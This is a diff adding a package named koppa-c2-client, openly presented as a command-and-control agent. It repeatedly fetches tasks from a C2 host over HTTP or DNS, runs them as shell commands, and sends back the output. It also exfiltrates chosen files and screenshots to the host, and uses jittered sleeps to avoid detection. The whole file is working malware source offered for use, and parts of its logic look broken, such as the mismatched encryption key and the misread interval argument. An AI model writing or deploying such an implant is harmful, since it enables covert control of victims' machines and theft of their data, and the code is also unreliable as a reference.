@@ -1,0 +1,63 @@
+## koppa package: koppa-c2-client
+## version: 2.0.0
+## description: KOPPA-C2 agent/client — connect to C2, execute tasks, exfil data over HTTP/DNS
+## author: KOPPA-OS
+## tags: c2, agent, covert, exfil
+
+import net, covert, evasion, log, sys, crypt
+
+fn connect_http(c2_host, c2_port, agent_id, interval) {
+    log.info("[*] C2 connect (HTTP): " + c2_host + ":" + c2_port)
+    let key = crypt.aes_keygen()
+    loop {
+        evasion.sleep_jitter(interval or 5000, (interval or 5000) * 2)
+        let task = net.http_get("http://" + c2_host + ":" + c2_port + "/task/" + agent_id)
+        if task != "" {
+            let cmd    = crypt.aes_decrypt(task, key)
+            let output = sys.exec(cmd)
+            let enc    = crypt.aes_encrypt(output, key)
+            net.http_post("http://" + c2_host + ":" + c2_port + "/result/" + agent_id, enc)
+        }
+    }
+}
+
+fn connect_dns(c2_domain, agent_id, interval) {
+    log.info("[*] C2 connect (DNS): " + c2_domain)
+    loop {
+        evasion.sleep_jitter(interval or 10000, (interval or 10000) * 2)
+        let task = covert.dns_receive(c2_domain, agent_id)
+        if task != "" {
+            let output = sys.exec(task)
+            covert.dns_exfil(output, c2_domain, agent_id)
+        }
+    }
+}
+
+fn exfil_file(path, c2_host, c2_port) {
+    log.info("[*] Exfil: " + path)
+    let data = sys.read_file(path)
+    let enc  = crypt.aes_encrypt(data, crypt.aes_keygen())
+    net.http_post("http://" + c2_host + ":" + c2_port + "/upload", enc)
+    log.ok("[+] Exfiltrated: " + path + " (" + data.size + " bytes)")
+}
+
+fn screenshot(c2_host, c2_port) {
+    let img = sys.screenshot()
+    net.http_post("http://" + c2_host + ":" + c2_port + "/upload", img)
+    log.ok("[+] Screenshot sent")
+}
+
+fn main(args) {
+    log.info("[koppa-c2-client] C2 Agent v2.0")
+    let mode = args[0] or "http"
+    let host = args[1] or sys.prompt("C2 host: ")
+    let port = args[2] or "8443"
+    let id   = args[3] or crypt.random_hex(8)
+
+    if mode == "http"  { connect_http(host, port, id, args[4].to_int()) }
+    if mode == "dns"   { connect_dns(host, id, args[3].to_int()) }
+    if mode == "exfil" {
+        let file = args[4] or sys.prompt("File path: ")
+        exfil_file(file, host, port)
+    }
+}
